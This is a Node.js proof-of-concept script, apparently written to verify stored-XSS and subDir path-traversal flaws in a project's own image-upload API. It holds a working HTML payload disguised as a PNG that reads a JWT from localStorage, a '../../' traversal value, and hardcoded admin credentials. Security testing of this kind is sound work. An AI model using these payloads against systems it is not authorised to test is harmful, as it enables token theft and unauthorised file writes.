/**
 * 安全验证 PoC：上传接口的「扩展名信任」与「subDir 路径穿越」
 *
 * 生产代码：
 *   UploadController.uploadImage  —— 只校验**客户端声明的** Content-Type（可随意伪造）
 *   FileUtil.saveFile             —— 直接把用户传入的 subDir 拼进磁盘路径；
 *                                    扩展名直接取自原始文件名，无白名单
 *
 * 两个后果：
 *   A. 存储型 XSS：把 .html 伪装成 image/png 上传，落盘为 .html，
 *      /assets/** 又是 permitAll 且由 Spring 按扩展名推断 Content-Type
 *      → 同源下可执行脚本，可读取 localStorage 里的 JWT
 *   B. 路径穿越：subDir=../xxx 可把文件写到 assets 目录之外
 *
 * 用法：node .workbuddy/_poc_upload_xss.mjs [baseUrl]
 */
const BASE = (process.argv[2] || 'http://127.0.0.1:8088').replace(/\/$/, '')

const login = await (await fetch(`${BASE}/api/v1/auth/login`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'admin', password: 'admin123' })
})).json()
const token = login?.data?.token
if (!token) { console.error('登录失败，无法继续'); process.exit(2) }

const XSS = '<!doctype html><meta charset=utf-8><script>document.title="PWNED:"+localStorage.getItem("token")</script><h1>uploaded</h1>'

async function upload({ filename, contentType, subDir, body }) {
  const fd = new FormData()
  fd.append('file', new Blob([body], { type: contentType }), filename)
  if (subDir) fd.append('subDir', subDir)
  const res = await fetch(`${BASE}/api/v1/upload/image`, {
    method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd
  })
  const text = await res.text()
  let parsed = null
  try { parsed = JSON.parse(text) } catch { /* ignore */ }
  return { status: res.status, url: parsed?.data?.url, body: text.slice(0, 120) }
}

console.log(`\n══ 上传接口安全 PoC ══  base=${BASE}\n`)

/* ── A. 伪装成图片的 HTML ── */
console.log('A. 把 HTML 伪装成 image/png 上传（文件名保持 .html）')
const a = await upload({ filename: 'poc.html', contentType: 'image/png', subDir: 'covers', body: XSS })
console.log(`   上传结果 HTTP ${a.status}  url=${a.url}`)
if (a.url) {
  const got = await fetch(`${BASE}${a.url}`)
  const ct = got.headers.get('content-type')
  const text = await got.text()
  console.log(`   回读 HTTP ${got.status}  Content-Type=${ct}`)
  console.log(`   响应体前 60 字: ${JSON.stringify(text.slice(0, 60))}`)
  const isHtml = (ct || '').includes('html')
  const isXss = text.includes('<script>')
  console.log(isHtml && isXss
    ? '   ⚠️  确认：以 text/html 返回且脚本原样送达 → 同源存储型 XSS，可读取 localStorage 中的 JWT\n'
    : `   ✅ 未构成 XSS（Content-Type=${ct}）\n`)
}

/* ── B. subDir 路径穿越 ── */
console.log('B. subDir 路径穿越（尝试写到 assets 目录之外）')
const b = await upload({ filename: 'escape.png', contentType: 'image/png', subDir: '../../traversal-poc', body: 'x' })
console.log(`   上传结果 HTTP ${b.status}  url=${b.url}`)
console.log('   请用下面这条命令确认文件是否落在 /app/assets 之外：')
console.log('     docker exec zhiguan-backend find /app -maxdepth 2 -name "traversal-poc" -o -maxdepth 2 -name "*.png" -newermt "-2 minutes" | head\n')

/* ── C. 对照组：正常图片应当正常 ── */
console.log('C. 对照组：真正的 PNG 上传（应正常）')
const png = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==',
  'base64'
)
const c = await upload({ filename: 'ok.png', contentType: 'image/png', subDir: 'covers', body: png })
console.log(`   HTTP ${c.status}  url=${c.url}`)
if (c.url) {
  const got = await fetch(`${BASE}${c.url}`)
  console.log(`   回读 HTTP ${got.status}  Content-Type=${got.headers.get('content-type')}`)
}
console.log()
